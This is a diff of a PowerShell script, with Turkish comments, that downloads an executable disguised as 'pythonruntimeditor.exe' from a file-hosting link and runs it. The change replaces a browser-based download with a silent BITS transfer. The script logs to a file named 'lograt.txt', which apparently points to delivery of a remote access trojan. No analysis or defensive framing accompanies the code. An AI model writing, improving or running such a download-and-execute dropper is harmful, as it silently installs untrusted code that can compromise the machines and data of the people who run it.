@@ -1,44 +1,25 @@
 # Ayarlar
-$url = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
-$downloadFolder = "$env:USERPROFILE\Downloads"
-$expectedFileName = "pythonruntimeditor.exe"
-$crdownloadName = "$expectedFileName.crdownload"
-$exePath = Join-Path $downloadFolder $expectedFileName
-$crPath = Join-Path $downloadFolder $crdownloadName
-$logFile = "$downloadFolder\lograt.txt"
+$exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
+$localPath = "$env:USERPROFILE\Downloads\pythonruntimeditor.exe"
+$logFile = "$env:USERPROFILE\Downloads\lograt.txt"
 
+# Log fonksiyonu
 function Log-Message {
     param([string]$msg)
     Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg")
 }
 
-# 1. Tarayıcıyı aç
-Start-Process "msedge.exe" $url
-Log-Message "Tarayıcı açıldı, indirme başlatıldı. Bekleniyor..."
+try {
+    Log-Message "BITS transfer başlatılıyor..."
 
-# 2. Dosya tam inene kadar bekle (maksimum 60 saniye)
-$timeout = 60
-$elapsed = 0
+    # Sessiz, stabil indirme başlasın
+    Start-BitsTransfer -Source $exeUrl -Destination $localPath -ErrorAction Stop
 
-while ($elapsed -lt $timeout) {
-    if (Test-Path $exePath) {
-        Log-Message "Dosya tamamen indi: $expectedFileName"
-        break
-    }
-    Start-Sleep -Seconds 1
-    $elapsed++
-}
+    Log-Message "İndirme tamamlandı: $localPath"
 
-# 3. Hâlâ .exe yoksa .crdownload'ı kontrol et
-if (-not (Test-Path $exePath) -and (Test-Path $crPath)) {
-    Log-Message ".exe yok ama .crdownload var. Yeniden adlandırılıyor..."
-    Rename-Item -Path $crPath -NewName $expectedFileName
-}
-
-# 4. Dosya şimdi var mı? Varsa çalıştır, yoksa ağla :(
-if (Test-Path $exePath) {
+    # Dosyayı çalıştır
     Log-Message "Dosya çalıştırılıyor..."
-    Start-Process -FilePath $exePath -WindowStyle Normal
-} else {
-    Log-Message "HATA: Dosya bulunamadı ya da bozuk indirildi. Kullanıcı el atsın!"
+    Start-Process -FilePath $localPath -WindowStyle Normal
+} catch {
+    Log-Message "HATA: $($_.Exception.Message)"
 }
